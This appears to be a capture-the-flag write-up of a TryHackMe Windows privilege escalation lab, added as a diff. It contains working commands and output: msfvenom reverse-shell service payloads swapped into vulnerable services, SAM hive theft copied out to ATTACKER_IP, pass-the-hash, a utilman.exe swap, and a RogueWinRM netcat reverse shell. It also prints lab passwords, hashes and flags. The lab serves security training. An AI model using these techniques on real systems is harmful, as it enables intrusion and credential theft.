@@ -627,3 +627,632 @@ SERVICE_NAME: apphostsvc
         ERROR_CONTROL      : 1   NORMAL
         BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
         LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Application Host Helper Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : localSystem
+
+C:\Users\thm-unpriv>sc qc WindowsScheduler
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WindowsScheduler
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : System Scheduler Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcusr1
+
+C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
+                                  NT AUTHORITY\SYSTEM:(I)(F)
+                                  BUILTIN\Administrators:(I)(F)
+                                  BUILTIN\Users:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Users\thm-unpriv>ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\thm-unpriv>dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\thm-unpriv
+
+09/01/2022  05:10 PM    <DIR>          .
+09/01/2022  05:10 PM    <DIR>          ..
+05/03/2022  03:14 PM    <DIR>          3D Objects
+05/03/2022  03:14 PM    <DIR>          Contacts
+05/04/2022  08:15 AM    <DIR>          Desktop
+05/03/2022  03:14 PM    <DIR>          Documents
+05/03/2022  03:14 PM    <DIR>          Downloads
+05/03/2022  03:14 PM    <DIR>          Favorites
+05/03/2022  03:14 PM    <DIR>          Links
+05/03/2022  03:14 PM    <DIR>          Music
+05/03/2022  03:14 PM    <DIR>          Pictures
+09/01/2022  05:10 PM            48,640 rev-svc.exe
+05/03/2022  03:14 PM    <DIR>          Saved Games
+05/03/2022  03:14 PM    <DIR>          Searches
+05/03/2022  03:14 PM    <DIR>          Videos
+               1 File(s)         48,640 bytes
+              14 Dir(s)  15,004,889,088 bytes free
+
+kali
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/Windows_priv]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4445 -f exe-service -o rev-svc.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe-service file: 48640 bytes
+Saved as: rev-svc.exe
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/Windows_priv]
+└─$ python3 -m http.server                  
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.90.7 - - [01/Sep/2022 13:10:30] "GET /rev-svc.exe HTTP/1.1" 200 -
+
+powershell 
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\thm-unpriv> wget http://10.11.81.220:8000/rev-svc.exe -O rev-svc.exe
+
+C:\Users\thm-unpriv>cd C:\PROGRA~2\SYSTEM~1\
+
+C:\PROGRA~2\SYSTEM~1>dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\PROGRA~2\SYSTEM~1
+
+05/03/2022  11:56 AM    <DIR>          .
+05/03/2022  11:56 AM    <DIR>          ..
+05/17/2007  01:47 PM             1,150 alarmclock.ico
+08/31/2003  12:06 PM               766 clock.ico
+08/31/2003  12:06 PM            80,856 ding.wav
+09/01/2022  05:07 PM    <DIR>          Events
+05/03/2022  11:56 AM                60 Forum.url
+01/08/2009  08:21 PM         1,637,972 libeay32.dll
+11/16/2004  12:16 AM             9,813 License.txt
+09/01/2022  02:35 PM               696 LogFile.txt
+09/01/2022  02:40 PM             1,343 LogfileAdvanced.txt
+03/25/2018  10:58 AM           536,992 Message.exe
+03/25/2018  10:59 AM           445,344 PlaySound.exe
+03/25/2018  10:58 AM            27,040 PlayWAV.exe
+05/03/2022  12:04 PM               108 Preferences.ini
+03/25/2018  10:58 AM           485,792 Privilege.exe
+03/24/2018  12:09 PM            10,100 ReadMe.txt
+03/25/2018  10:58 AM           112,544 RunNow.exe
+03/25/2018  10:59 AM            40,352 sc32.exe
+08/31/2003  12:06 PM               766 schedule.ico
+03/25/2018  10:58 AM         1,633,696 Scheduler.exe
+03/25/2018  10:59 AM           491,936 SendKeysHelper.exe
+03/25/2018  10:58 AM           437,664 ShowXY.exe
+03/25/2018  10:58 AM           439,712 ShutdownGUI.exe
+03/25/2018  10:58 AM           235,936 SSAdmin.exe
+03/25/2018  10:58 AM           731,552 SSCmd.exe
+01/08/2009  08:12 PM           355,446 ssleay32.dll
+03/25/2018  10:58 AM           456,608 SSMail.exe
+05/03/2022  11:56 AM             6,867 unins000.dat
+05/03/2022  11:56 AM           722,597 unins000.exe
+05/03/2022  11:56 AM                54 Website.url
+06/26/2009  05:27 PM             6,574 whiteclock.ico
+03/25/2018  10:58 AM            76,704 WhoAmI.exe
+05/16/2006  04:49 PM           785,042 WSCHEDULER.CHM
+05/16/2006  03:58 PM             2,026 WScheduler.cnt
+03/25/2018  10:58 AM           331,168 WScheduler.exe
+05/16/2006  04:58 PM           703,081 WSCHEDULER.HLP
+03/25/2018  10:58 AM           136,096 WSCtrl.exe
+03/25/2018  10:58 AM            98,720 WService.exe
+03/25/2018  10:58 AM            68,512 WSLogon.exe
+03/25/2018  10:59 AM            33,184 WSProc.dll
+              38 File(s)     11,144,869 bytes
+               3 Dir(s)  15,004,889,088 bytes free
+
+C:\PROGRA~2\SYSTEM~1>move WService.exe WService.exe.bkp
+        1 file(s) moved.
+
+C:\PROGRA~2\SYSTEM~1>move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+        1 file(s) moved.
+
+C:\PROGRA~2\SYSTEM~1>icacls WService.exe /grant Everyone:F
+processed file: WService.exe
+Successfully processed 1 files; Failed processing 0 files
+
+netcat kali machine
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4445  
+
+stop/start service
+C:\PROGRA~2\SYSTEM~1>sc stop windowsscheduler
+
+SERVICE_NAME: windowsscheduler
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x1
+        WAIT_HINT          : 0x3e8
+
+C:\PROGRA~2\SYSTEM~1>sc start windowsscheduler
+
+SERVICE_NAME: windowsscheduler
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 4352
+        FLAGS              :
+
+rev_shell
+
+──(kali㉿kali)-[~]
+└─$ nc -nlvp 4445          
+listening on [any] 4445 ...
+connect to [10.11.81.220] from (UNKNOWN) [10.10.90.7] 49915
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+wprivesc1\svcusr1
+
+C:\Windows\system32>cd ..
+cd ..
+
+C:\Windows>cd ..
+cd ..
+```
+```text
+C:\>cd Users
+cd Users
+
+C:\Users>cd svcusr1
+cd svcusr1
+
+C:\Users\svcusr1>cd Desktop
+cd Desktop
+
+C:\Users\svcusr1\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\svcusr1\Desktop
+
+05/03/2022  01:00 PM    <DIR>          .
+05/03/2022  01:00 PM    <DIR>          ..
+06/21/2016  03:36 PM               527 EC2 Feedback.website
+06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
+05/03/2022  01:01 PM                20 flag.txt
+               3 File(s)          1,101 bytes
+               2 Dir(s)  15,004,762,112 bytes free
+
+C:\Users\svcusr1\Desktop>more flag.txt
+more flag.txt
+THM{AT_YOUR_SERVICE}
+```
+Get the flag on svcusr1's desktop.
+```text
+C:\Users\thm-unpriv>sc qc "disk sorter enterprise"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: disk sorter enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Disk Sorter Enterprise
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcusr2
+
+C:\Users\thm-unpriv>icacls c:\MyPrograms
+c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+              BUILTIN\Administrators:(I)(OI)(CI)(F)
+              BUILTIN\Users:(I)(OI)(CI)(RX)
+              BUILTIN\Users:(I)(CI)(AD)
+              BUILTIN\Users:(I)(CI)(WD)
+              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/Windows_priv]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4446 -f exe-service -o rev-svc2.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe-service file: 48640 bytes
+Saved as: rev-svc2.exe
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/Windows_priv]
+└─$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.90.7 - - [01/Sep/2022 13:24:54] "GET /rev-svc2.exe HTTP/1.1" 200 -
+
+PS C:\Users\thm-unpriv> wget http://10.11.81.220:8000/rev-svc2.exe -O rev-svc2.exe
+
+C:\Users\thm-unpriv>dir                                                                                                    Volume in drive C has no label.                                                                                           Volume Serial Number is A8A4-C362                                                                                                                                                                                                                   Directory of C:\Users\thm-unpriv                                                                                                                                                                                                                   09/01/2022  05:24 PM    <DIR>          .                                                                                  09/01/2022  05:24 PM    <DIR>          ..                                                                                 05/03/2022  03:14 PM    <DIR>          3D Objects                                                                         05/03/2022  03:14 PM    <DIR>          Contacts                                                                           05/04/2022  08:15 AM    <DIR>          Desktop                                                                            05/03/2022  03:14 PM    <DIR>          Documents                                                                          05/03/2022  03:14 PM    <DIR>          Downloads                                                                          05/03/2022  03:14 PM    <DIR>          Favorites                                                                          05/03/2022  03:14 PM    <DIR>          Links                                                                              05/03/2022  03:14 PM    <DIR>          Music                                                                              05/03/2022  03:14 PM    <DIR>          Pictures                                                                           09/01/2022  05:24 PM            48,640 rev-svc2.exe                                                                       05/03/2022  03:14 PM    <DIR>          Saved Games                                                                        05/03/2022  03:14 PM    <DIR>          Searches                                                                           05/03/2022  03:14 PM    <DIR>          Videos                                                                                            1 File(s)         48,640 bytes                                                                                           14 Dir(s)  15,003,557,888 bytes free                                                                                                                                                                                                  C:\Users\thm-unpriv>move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe                                                  1 file(s) moved.                                                                                                                                                                                                                            C:\Users\thm-unpriv>icacls C:\MyPrograms\Disk.exe /grant Everyone:F                                                       processed file: C:\MyPrograms\Disk.exe                                                                                    Successfully processed 1 files; Failed processing 0 files
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4446
+
+C:\Users\thm-unpriv>sc stop "disk sorter enterprise"
+
+SERVICE_NAME: disk sorter enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\Users\thm-unpriv>sc start "disk sorter enterprise"
+
+SERVICE_NAME: disk sorter enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+        PID                : 4700
+        FLAGS              :
+
+C:\Users\thm-unpriv>cd C:\MyPrograms
+
+C:\MyPrograms>dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\MyPrograms
+
+09/01/2022  05:25 PM    <DIR>          .
+09/01/2022  05:25 PM    <DIR>          ..
+05/03/2022  03:16 PM    <DIR>          Disk Sorter Enterprise
+09/01/2022  05:24 PM            48,640 Disk.exe
+05/03/2022  07:44 PM    <DIR>          THMService
+               1 File(s)         48,640 bytes
+               4 Dir(s)  15,002,382,336 bytes free
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4446
+listening on [any] 4446 ...
+connect to [10.11.81.220] from (UNKNOWN) [10.10.90.7] 49918
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+wprivesc1\svcusr2
+
+C:\Windows\system32>more C:\Users\svcusr2\Desktop\flag.txt
+more C:\Users\svcusr2\Desktop\flag.txt
+THM{QUOTES_EVERYWHERE}
+```
+Get the flag on svcusr2's desktop.
+```text
+C:\Users\thm-unpriv>cd C:\tools\AccessChk
+
+C:\tools\AccessChk>accesschk64.exe -qlc thmservice
+
+Accesschk v6.14 - Reports effective permissions for securable objects
+Copyright ⌐ 2006-2021 Mark Russinovich
+Sysinternals - www.sysinternals.com (accept terms)
+
+thmservice
+  DESCRIPTOR FLAGS:
+      [SE_DACL_PRESENT]
+      [SE_SACL_PRESENT]
+      [SE_SELF_RELATIVE]
+  OWNER: NT AUTHORITY\SYSTEM
+  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_PAUSE_CONTINUE
+        SERVICE_START
+        SERVICE_STOP
+        SERVICE_USER_DEFINED_CONTROL
+        READ_CONTROL
+  [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  [2] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\INTERACTIVE
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_USER_DEFINED_CONTROL
+        READ_CONTROL
+  [3] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SERVICE
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_USER_DEFINED_CONTROL
+        READ_CONTROL
+  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
+        SERVICE_ALL_ACCESS
+
+C:\tools\AccessChk>
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/Windows_priv]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4447 -f exe-service -o rev-svc3.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe-service file: 48640 bytes
+Saved as: rev-svc3.exe
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/Windows_priv]
+└─$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.90.7 - - [01/Sep/2022 13:34:57] "GET /rev-svc3.exe HTTP/1.1" 200 -
+
+PS C:\Users\thm-unpriv> wget http://10.11.81.220:8000/rev-svc3.exe -O rev-svc3.exe
+
+C:\Users\thm-unpriv>icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+processed file: C:\Users\thm-unpriv\rev-svc3.exe
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Users\thm-unpriv>sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+[SC] ChangeServiceConfig SUCCESS
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4447
+
+C:\Users\thm-unpriv>sc stop THMService
+[SC] ControlService FAILED 1062:
+
+The service has not been started.
+
+C:\Users\thm-unpriv>sc start THMService
+
+SERVICE_NAME: THMService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 2616
+        FLAGS              :
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4447
+listening on [any] 4447 ...
+connect to [10.11.81.220] from (UNKNOWN) [10.10.90.7] 49926
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>more C:\Users\Administrator\Desktop\flag.txt         
+more C:\Users\Administrator\Desktop\flag.txt
+THM{INSECURE_SVC_CONFIG}
+```
+Get the flag on the Administrator's desktop.
+### Abusing dangerous privileges
+Windows Privileges
+Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.
+Each user has a set of assigned privileges that can be checked with the following command:
+`whoami /priv`
+A complete list of available privileges on Windows systems is available [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.
+While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.
+SeBackup / SeRestore
+The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.
+Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.
+Log in to the target machine via RDP using the following credentials:
+User: THMBackup
+Password: CopyMaster555
+This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:
+Once on the command prompt, we can check our privileges with the following command:
+Command Prompt
+```text
+C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeBackupPrivilege             Back up files and directories  Disabled
+SeRestorePrivilege            Restore files and directories  Disabled
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+To backup the SAM and SYSTEM hashes, we can use the following commands:
+Command Prompt
+```text
+C:\> reg save hklm\system C:\Users\THMBackup\system.hive
+The operation completed successfully.
+```
+```text
+C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
+The operation completed successfully.
+```
+This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:
+```text
+Kali Linux
+
+user@attackerpc$ mkdir share
+user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+```
+This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox:
+```text
+Command Prompt
+```
+```text
+C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+```
+```text
+C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+```
+And use impacket to retrieve the users' password hashes:
+```text
+Kali Linux
+
+user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
+```text
+Kali Linux
+
+user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.12.124
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.175.90.....
+[*] Found writable share ADMIN$
+[*] Uploading file nfhtabqO.exe
+[*] Opening SVCManager on 10.10.175.90.....
+[*] Creating service RoLE on 10.10.175.90.....
+[*] Starting service RoLE.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+SeTakeOwnership
+The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.
+Log in to the target machine via RDP using the following credentials:
+User: THMTakeOwnership
+Password: TheWorldIsMine2022
+To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:
+Once on the command prompt, we can check our privileges with the following command:
+```text
+Command Prompt
+```
+```text
+C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                              State
+============================= ======================================== ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
+```
+We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:
+Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.
+To replace utilman, we will start by taking ownership of it with the following command:
+```text
+Command Prompt
+```
+```text
+C:\> takeown /f C:\Windows\System32\Utilman.exe
+
+SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
+```
+Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:
+```text
+Command Prompt
+```
+```text
+C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+processed file: Utilman.exe
+Successfully processed 1 files; Failed processing 0 files
+```
+After this, we will replace utilman.exe with a copy of cmd.exe:
+```text
+Command Prompt
+
+C:\Windows\System32\> copy cmd.exe utilman.exe
+        1 file(s) copied.
+```
+To trigger utilman, we will lock our screen from the start button:
+And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:
+SeImpersonate / SeAssignPrimaryToken
+These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
+Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.
+Let's assume we have an FTP service running with user ftp. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:
+There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the ftp user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user ftp. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user ftp, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the ftp user has access.
+If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:
+Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user ftp in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.
+As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.
+In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.
+To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.
+We will use RogueWinRM exploit to accomplish both conditions.
+Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:
+http://10.10.12.124/
+We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:
+To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the C:\tools\ folder.
+The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.
+If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.
+Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
+```text
+Kali Linux
+
+user@attackerpc$ nc -lvp 4442
+```
+And then, use our web shell to trigger the RogueWinRM exploit using the following command:
+```text
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+```
+Note: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.
+The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe ATTACKER_IP 4442.
+If all was correctly set up, you should expect a shell with SYSTEM privileges:
+```text
+Kali Linux
+
+user@attackerpc$ nc -lvp 4442
+Listening on 0.0.0.0 4442
+Connection received on 10.10.175.90 49755
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+nt authority\system
+```
+Using any of the three methods discussed in this task, gain access to the Administrator's desktop and collect the flag. Don't forget to input the flag at the end of this task.
+```text
+┌──(kali㉿kali)-[~]
+└─$ xfreerdp /u:THMBackup /p:'CopyMaster555' /v:10.10.12.124 /size:90%
+
+(cmd like administrator and the pass is CopyMaster555)
+C:\Windows\system32>whoami
+wprivesc2\thmbackup
+
+C:\Windows\system32>whoami /priv
+
+PRIVILEGES INFORMATION
